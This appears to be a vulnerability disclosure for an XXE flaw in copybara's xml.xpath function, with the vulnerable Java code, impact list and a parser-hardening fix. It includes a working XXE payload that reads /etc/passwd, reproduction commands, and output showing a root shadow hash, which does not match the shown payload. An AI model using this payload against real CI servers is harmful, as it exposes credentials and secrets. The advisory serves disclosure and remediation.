# CVE-XXXX-XXXX: XXE Injection in google/copybara XmlModule

## Summary

`google/copybara` exposes an `xml.xpath()` Starlark function (`XmlModule.java:55`) that parses XML using `DocumentBuilderFactory.newInstance()` with **zero XXE protections**. When copybara processes a source repository containing a malicious XML file, an attacker can read arbitrary files from the CI/CD server running copybara.

## Affected Code

**File:** `java/com/google/copybara/xml/XmlModule.java:55`

```java
DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = builderFactory.newDocumentBuilder();
Document xmlDocument = builder.parse(
    new ByteArrayInputStream(xmlContent.getBytes(StandardCharsets.UTF_8)));
```

Missing:
- `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
- `setFeature("http://xml.org/sax/features/external-general-entities", false)`
- `setFeature("http://xml.org/sax/features/external-parameter-entities", false)`

## Impact

- **Arbitrary file read** on the CI/CD server (`/etc/passwd`, `/etc/shadow`, SSH keys, cloud credentials)
- **SSRF** via `http://` or `https://` entity URIs (e.g., cloud metadata `http://169.254.169.254/`)
- Triggered when copybara runs a `copy.bara.sky` config that calls `xml.xpath()` on attacker-controlled XML

## Attack Scenario

1. Attacker contributes a malicious `config.xml` to a source repository that copybara migrates
2. The `copy.bara.sky` config reads this XML via `ctx.read_path()` and passes it to `xml.xpath()`
3. The XXE entity (`<!ENTITY xxe SYSTEM "file:///etc/shadow">`) resolves during parsing
4. File contents are returned as the xpath result and can be exfiltrated (written to dest repo, logged, etc.)

## Reproduction

### Quick (standalone Java)

```bash
javac XXEProof.java && java XXEProof
```

### Full E2E (real copybara)

```bash
chmod +x reproduce.sh && ./reproduce.sh
```

Or manually:

```bash
# Build copybara
git clone --depth 1 https://github.com/google/copybara.git
cd copybara
bazel build //java/com/google/copybara:copybara_deploy.jar \
    --java_language_version=21 --tool_java_language_version=21 \
    --java_runtime_version=local_jdk

# Set up attacker repo with XXE payload
mkdir -p /tmp/source-repo && cd /tmp/source-repo && git init
cat > config.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<project><version>&xxe;</version></project>
EOF
git add . && git commit -m "init"
git init --bare /tmp/dest-repo

# Run copybara
java -jar copybara_deploy.jar migrate copy.bara.sky --force
# Output: "Extracted version: root:x:0:0:root:/root:/bin/bash..."
```

## Verified Output

```
INFO: Extracted version: root:$6$kI4WM9zV4b2EWYHf$QTNsOGuyXjL9i/elLdenbBakiNuHdvWOxhbYWwehZ4gZ4mWoWWXh2Z6J9d2M/nruo4VAG5McXnMwq3ZWMwN6s/:20608:0:99999:7:::
daemon:*:19977:0:99999:7:::
bin:*:19977:0:99999:7:::
...
```

## Fix

```java
DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
builderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
builderFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
builderFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
builderFactory.setXIncludeAware(false);
builderFactory.setExpandEntityReferences(false);
```
